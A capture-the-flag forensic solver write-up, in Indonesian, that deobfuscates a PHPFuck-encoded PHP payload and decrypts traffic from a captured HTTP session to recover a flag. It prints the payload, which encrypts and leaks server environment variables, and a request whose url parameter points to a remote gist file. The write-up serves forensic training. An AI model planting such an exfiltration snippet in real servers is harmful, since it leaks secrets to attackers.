# Solver

1. Reverse code PHPnya terlebih dahulu untuk mencari tahu behaviour dari payload yang digunakan. Probset menggunakan [PHPFuck](https://github.com/splitline/PHPFuck) untuk mengobfuscate code sederhana seperti ini

```php
echo base64_encode(openssl_encrypt(getenv($_GET["a"]), "AES-256-CBC", md5($_SERVER["HTTP_REFERER"]), OPENSSL_RAW_DATA, str_pad(date("dHis"), 16, date("dHis"))));
```

Dimana code php tersebut akan mengencrypt environment yang diinput pada parameter `a` menggunakan AES mode CBC dan key nya didapat dari hash md5 dari value header `Referer` dan IV nya didapat dari formatting tanggal sebanyak 2 kali. Untuk mendeobfuscate codenya bisa menggunakan [deobfuscate.py](/ara6-ctf-challenges/final/forensic/File%20PCAP%20Sederhana/poc/deobfuscate.py). Output dari deobfuscate akan terlihat sebagai berikut:

```
((c).(r).(e).(a).(t).(e).(_).(f).(u).(n).(c).(t).(i).(o).(n))(...((s).(t).(r).(_).(g).(e).(t).(c).(s).(v))((,).(").(e).(c).(h).(o).( ).(b).(a).(s).(e).(6).(4).(_).(e).(n).(c).(o).(d).(e).(().(o).(p).(e).(n).(s).(s).(l).(_).(e).(n).(c).(r).(y).(p).(t).(().(g).(e).(t).(e).(n).(v).(().($).(_).(G).(E).(T).([).(").(").(a).(").(").(]).()).(,).( ).(").(").(A).(E).(S).(-).(2).(5).(6).(-).(C).(B).(C).(").(").(,).( ).(m).(d).(5).(().($).(_).(S).(E).(R).(V).(E).(R).([).(").(").(H).(T).(T).(P).(_).(R).(E).(F).(E).(R).(E).(R).(").(").(]).()).(,).( ).(O).(P).(E).(N).(S).(S).(L).(_).(R).(A).(W).(_).(D).(A).(T).(A).(,).( ).(s).(t).(r).(_).(p).(a).(d).(().(d).(a).(t).(e).(().(").(").(d).(H).(i).(s).(").(").()).(,).( ).(1).(6).(,).( ).(d).(a).(t).(e).(().(").(").(d).(H).(i).(s).(").(").()).()).()).()).(;).(")))()
```

2. Setelah peserta mengetahui behaviour payloadnya, maka tinggal mendecrypt output tiap environment. Sebagai contoh

```
GET /a.php?url=https%3A%2F%2Fgist.githubusercontent.com%2Fdaffainfo%2F4cfe67a97722f0d3434de0f81c38849a%2Fraw%2F6088fb87f42ee4aa420d1f2fd9cef8f9bc3cd266%2Fs.txt&a=FLAG28 HTTP/1.1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Host: 188.166.246.10:8080
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Referer: https://yahoo.com/


HTTP/1.1 200 OK
Host: 188.166.246.10:8080
Date: Wed, 22 Jan 2025 06:20:20 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Content-type: text/html; charset=UTF-8

3KDFgkM7r9+2sFEeSmcitg==
```

Jika dilihat pada request diatas, keynya bisa didapat dari header referer yaitu: `md5sum('https://yahoo.com/')` dan hasilnya adalah `df7135f292d9c55fb45d920b7a4eed92`. Dan yang terakhir ivnya bisa didapat dari header date yaitu `22 06 20 20` dan double hasilnya untuk mendapatkan iv yaitu `2206202022062020`

![example output](output.png)

Ulangi langkah diatas untuk tiap character